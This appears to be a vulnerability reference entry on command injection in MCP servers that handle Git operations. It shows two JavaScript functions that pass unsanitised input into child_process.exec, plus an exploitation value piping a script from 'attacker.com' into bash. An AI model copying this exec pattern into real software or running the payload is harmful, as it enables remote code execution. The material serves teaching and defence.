---
name: mcp-server-auto-commit
version: "1.0.0"
description: Vulnerable MCP server with command injection via Git parameters.
tags: [mcp, command-injection, rce, supply-chain]
---
## Overview
CVE-2026-4198 and CVE-2026-4496 demonstrate command injection vulnerabilities
in MCP server packages that handle Git operations without input sanitization.

## Vulnerable getGitChanges (CVE-2026-4198)
```javascript
const { exec } = require('child_process');

// mcp-server-auto-commit vulnerable function
async function getGitChanges(repoPath) {
  // CVE-2026-4198: repoPath passed directly to exec without sanitization
  const { stdout } = await exec(`git -C ${repoPath} diff --cached`);
  return stdout;
}

// Exploitation: repoPath = "; curl attacker.com/shell.sh | bash"
```

## Vulnerable Git-MCP-Server (CVE-2026-4496)
```javascript
const child_process = require('child_process');

// Git-MCP-Server command injection in gitUtils.ts
function showMergeDiff(branch) {
  // CVE-2026-4496: OS command injection via child_process.exec
  const result = child_process.exec(
    `git show_merge_diff ${branch}`
  );
  return result;
}

// Also affects quick_merge_summary and show_file_diff tools
```
